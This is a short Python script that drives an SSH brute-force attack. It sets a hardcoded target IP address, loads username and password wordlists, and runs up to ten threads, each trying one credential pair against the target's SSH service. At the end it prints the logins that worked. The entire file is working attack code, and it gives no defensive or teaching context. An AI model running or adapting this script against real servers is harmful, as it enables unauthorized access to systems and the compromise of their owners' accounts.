from src.sshBrute import SSH, Brute, threading
from src.DataClasses import sshBruteData

import time

data = sshBruteData(target="192.46.232.67", thr=10, timeout=0.1, wordlist_usernames_path='a.txt', wordlist_passwords_path='b.txt')


SSH(data).load_wordlist_usernames()
SSH(data).load_wordlist_passwords()

threads = []
for user in data.wordlist_usernames:
	for password in data.wordlist_passwords:
		while True:
			if threading.active_count() < data.thr:
				i = Brute(data, user, password)
				i.start()
				threads.append(i)
				time.sleep(data.timeout)
				break

for t in threads:
	t.join()


print(data.goods)
